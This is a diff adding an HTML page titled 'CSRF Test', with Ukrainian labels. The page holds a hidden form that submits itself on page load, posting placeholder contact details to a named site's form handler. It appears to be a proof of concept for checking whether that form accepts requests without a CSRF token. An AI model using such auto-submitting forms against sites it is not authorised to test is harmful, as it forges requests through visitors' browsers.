@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Test</title>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <h1>CSRF Test - Спроба атаки без токена</h1>
+    
+    <form id="csrf-form" method="post" action="https://zafaley.com/form-handler.php">
+        <input type="hidden" name="name" value="CSRF Test">
+        <input type="hidden" name="surname" value="Attack">
+        <input type="hidden" name="email" value="csrf.test@example.com">
+        <input type="hidden" name="phone" value="380503343224">
+        <input type="hidden" name="comments" value="Це тестова CSRF атака">
+        <input type="submit" value="Відправити форму">
+    </form>
+    
+    <script>
+        window.onload = function() {
+            document.getElementById('csrf-form').submit();
+        };
+    </script>
+</body>
+</html>
